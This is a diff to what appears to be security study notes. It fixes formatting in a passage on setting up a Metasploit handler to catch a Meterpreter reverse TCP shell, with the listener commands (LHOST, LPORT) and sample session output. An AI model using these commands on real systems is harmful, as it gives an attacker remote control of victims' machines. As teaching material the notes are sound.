@@ -119,7 +119,7 @@
     - A tool on the attacker’s system that waits for incoming connections from exploited systems. It "catches" the reverse shell connection, allowing remote control of the victim’s system
 
     - `msf exploit > use exploit/multi/handler`
-    - `msf exploit(handler) > set payload windows/meterpreter/reverse_tcp`
+    - `msf exploit (handler) > set payload windows/meterpreter/reverse_tcp`
     - `msf exploit (handler) > set LHOST 10.0.1.45`
     - `msf exploit (handler) > set LPORT 443`
     - `msf exploit (handler) > exploit -j`
@@ -131,7 +131,7 @@
       
     - `[*] Sending stage (749056 bytes) to 10.0.1.12`
     - `[*] Meterpreter session 1 opened (10.0.1.45:443 -> 10.0.1.12:2718) msf exploit (handler) > sessions -i 1`
-    -` [*] Starting interaction with 1.. >`
+    - `[*] Starting interaction with 1.. >`
     - This gives the attacker remote control over the system.
 
 
